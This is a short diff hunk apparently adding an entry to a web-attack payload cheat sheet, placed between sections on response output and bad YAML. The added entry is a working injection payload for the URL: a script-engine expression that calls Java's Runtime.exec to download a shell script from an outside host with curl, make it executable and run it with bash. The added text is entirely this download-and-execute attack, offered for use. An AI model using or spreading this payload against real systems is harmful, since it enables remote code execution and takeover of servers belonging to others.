@@ -11943,6 +11943,14 @@ Response.write(o)
 -->
 ```
 
+Javascript command execution In the url, urlencoded
+
+```c
+${script:javascript:java.lang.Runtime.getRuntime().exec(' curl 
+192.168.x.x/shell.sh -o /tmp/shell.sh;chmod 777 /tmp/shell.sh;bash 
+/tmp/shell.sh')}
+```
+
 #### Bad YAML
 
 ```c
